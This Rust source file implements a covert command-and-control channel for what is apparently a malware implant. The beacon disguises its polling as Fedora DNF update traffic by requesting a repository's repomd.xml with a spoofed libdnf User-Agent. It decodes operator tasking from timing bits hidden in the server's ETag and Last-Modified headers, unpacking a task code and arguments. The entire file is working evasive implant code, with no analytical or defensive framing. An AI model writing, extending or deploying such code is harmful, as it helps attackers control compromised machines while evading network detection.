use crate::crypto::TimeBasedKey;
use crate::errors::ChannelError;
use crate::dns;
use crate::sys;
use core::net::SocketAddr;

pub struct DnfChannel {
    host: String,
    port: u16,
    path: String,
    last_etag: std::cell::RefCell<String>,
}

/// Decoded tasking from a DNF channel response
pub struct DnfTasking {
    pub task_code: u8,
    pub args: u16,
    pub raw_bits: u32,
}

impl DnfChannel {
    pub fn new(host: &str, port: u16) -> Self {
        Self {
            host: host.to_string(),
            port,
            path: "/pub/fedora/linux/updates/42/Everything/x86_64/os/repodata/repomd.xml".to_string(),
            last_etag: std::cell::RefCell::new(String::new()),
        }
    }

    /// Poll the DNF channel for tasking. Returns None if no tasking available.
    pub fn poll(&self, tbk: &TimeBasedKey) -> Result<Option<DnfTasking>, ChannelError> {
        crate::dbg_log!("[beacon] polling dnf channel");

        let request = self.build_request();

        let ips = dns::lookup_a(&self.host)
            .map_err(|e| ChannelError::SendFailed(e.to_string()))?;
        let fd = sys::socket_tcp()
            .map_err(|e| ChannelError::SendFailed(e.to_string()))?;


        let mut last_err: Option<ChannelError> = None;
        let mut connected = false;

        for ip in ips.v4_records() {
            let addr = SocketAddr::from((ip.addr, self.port));
            crate::dbg_log!("[dnf] connecting to endpoint {}:{}", ip.addr, self.port);
            match sys::connect_tcp(fd, &addr)
                .map_err(|e| ChannelError::SendFailed(e.to_string())) {
                    Ok(()) => { connected = true; break; }
                    Err(e) => last_err = Some(e),
            }
        }

        if !connected {
            crate::dbg_log!("[dnf] failed to connect to any endpoints");
            return Err(ChannelError::SendFailed(
                last_err.map(|e| e.to_string()).unwrap_or_else(|| "no addresses".into())
            ));
        }
        
        sys::write_all(fd, &request)
            .map_err(|e| ChannelError::SendFailed(e.to_string()))?;

        // Read response
        let mut response = Vec::new();
        let mut buf = [0u8; 4096];
        sys::set_read_timeout(fd, 10)
            .map_err(|e| ChannelError::SendFailed(e.to_string()))?;
        loop {
            match sys::read(fd, &mut buf) {
                Ok(0) => break,
                Ok(n) => response.extend_from_slice(&buf[..n]),

                Err(e) => {
                    let _ = sys::close(fd);
                    return Err(ChannelError::SendFailed(e.to_string()));
                }
            }
        }
        let _ = sys::close(fd);

        let response_str = String::from_utf8_lossy(&response);

        // Extract Last-Modified and ETag from response
        let last_modified = Self::extract_header(&response_str, "Last-Modified");
        let etag = Self::extract_header(&response_str, "ETag");

        let (last_modified, etag) = match (last_modified, etag) {
            (Some(lm), Some(et)) => (lm, et),
            _ => return Ok(None),
        };

        // Skip if we've already seen this ETag
        {
            let last = self.last_etag.borrow();
            if *last == etag {
                return Ok(None);
            }
        }
        // Mark as seen immediately
        self.last_etag.replace(etag.clone());

        // Parse the Last-Modified timestamp to epoch seconds
        let lm_epoch = Self::parse_http_date(&last_modified);
        if lm_epoch == 0 {
            return Ok(None);
        }

        let _tasking_key = tbk.derive_from_epoch(lm_epoch);
        crate::dbg_log!(
            "[dnf] beacon poll: lm='{}' lm_epoch={} key_mask=0x{:05x} mtime_us={} sub_second={}",
            last_modified, lm_epoch, _tasking_key & 0xFFFFF, "pending", "pending"
        );

        // Parse ETag - Apache format: "size_hex-mtime_hex"
        let etag_clean = etag.trim_matches('"');
        let mtime_hex = match etag_clean.split('-').nth(1) {
            Some(m) => m,
            None => return Ok(None),
        };

        // Convert mtime hex to integer (microseconds since epoch)
        let mtime_us = match u64::from_str_radix(mtime_hex, 16) {
            Ok(v) => v,
            Err(_) => return Ok(None),
        };

        // The legitimate mtime in microseconds (from Last-Modified, seconds precision)
        let lm_us = (lm_epoch as u64) * 1_000_000;

        // Check if the seconds match - if not, this ETag is from a different
        // content version than we expect
        if mtime_us / 1_000_000 != lm_us / 1_000_000 {
            return Ok(None);
        }

        // Extract the sub-second microsecond portion - this is where tasking is encoded
        let sub_second = (mtime_us % 1_000_000) as u32;

        // The sub-second value has 20 bits of usable space (0-999999, ~20 bits)
        // Derive a key from the Last-Modified timestamp to decrypt
        let tasking_key = tbk.derive_from_epoch(lm_epoch);

        // XOR the sub-second value with the derived key to decode tasking
        let decoded = sub_second ^ (tasking_key & 0xFFFFF);

        crate::dbg_log!(
            "[dnf] beacon poll: lm_epoch={} mtime_us={} sub_second={} key_mask=0x{:05x} decoded=0x{:05x}",
            lm_epoch, mtime_us, sub_second, tasking_key & 0xFFFFF, decoded
        );

        // 0 means no tasking (or natural microsecond value)
        if decoded == 0 {
            return Ok(None);
        }

        // Unpack: bits 0-7 = task code, bits 8-19 = args
        let task_code = (decoded & 0xFF) as u8;
        let args = ((decoded >> 8) & 0xFFF) as u16;

        Ok(Some(DnfTasking {
            task_code,
            args,
            raw_bits: decoded,
        }))
    }

    fn build_request(&self) -> Vec<u8> {
        let mut req = Vec::with_capacity(512);
        req.extend_from_slice(b"GET ");
        req.extend_from_slice(self.path.as_bytes());
        req.extend_from_slice(b" HTTP/1.1\r\n");
        req.extend_from_slice(b"Host: ");
        req.extend_from_slice(self.host.as_bytes());
        req.extend_from_slice(b"\r\n");
        req.extend_from_slice(b"User-Agent: libdnf (Fedora Linux 42; kde; Linux.x86_64)\r\n");
        req.extend_from_slice(b"Accept: */*\r\n");
        req.extend_from_slice(b"Cache-Control: no-cache\r\n");
        req.extend_from_slice(b"Pragma: no-cache\r\n");
        req.extend_from_slice(b"Connection: keep-alive\r\n");
        req.extend_from_slice(b"\r\n");
        req
    }

    fn extract_header<'a>(response: &'a str, name: &str) -> Option<String> {
        response
            .lines()
            .find(|l| l.to_lowercase().starts_with(&name.to_lowercase()))
            .map(|l| l.splitn(2, ':').nth(1).unwrap_or("").trim().to_string())
    }

    fn parse_http_date(date_str: &str) -> i64 {
        // Parse "Wed, 09 Apr 2025 11:06:59 GMT" to epoch seconds
        // Manual parsing to avoid adding chrono dependency on beacon side
        let parts: Vec<&str> = date_str.split_whitespace().collect();
        if parts.len() < 6 {
            return 0;
        }

        let day: u32 = parts[1].parse().unwrap_or(0);
        let month = match parts[2] {
            "Jan" => 1, "Feb" => 2, "Mar" => 3, "Apr" => 4,
            "May" => 5, "Jun" => 6, "Jul" => 7, "Aug" => 8,
            "Sep" => 9, "Oct" => 10, "Nov" => 11, "Dec" => 12,
            _ => return 0,
        };
        let year: i64 = parts[3].parse().unwrap_or(0);
        let time_parts: Vec<u32> = parts[4]
            .split(':')
            .filter_map(|p| p.parse().ok())
            .collect();

        if time_parts.len() != 3 || day == 0 || year == 0 {
            return 0;
        }

        // Simplified epoch calculation (not accounting for leap seconds)
        let mut y = year;
        let mut m = month as i64;
        if m <= 2 {
            y -= 1;
            m += 12;
        }
        let days = 365 * y + y / 4 - y / 100 + y / 400
            + (153 * (m - 3) + 2) / 5
            + day as i64
            - 719469;

        days * 86400 + time_parts[0] as i64 * 3600
            + time_parts[1] as i64 * 60
            + time_parts[2] as i64
    }
}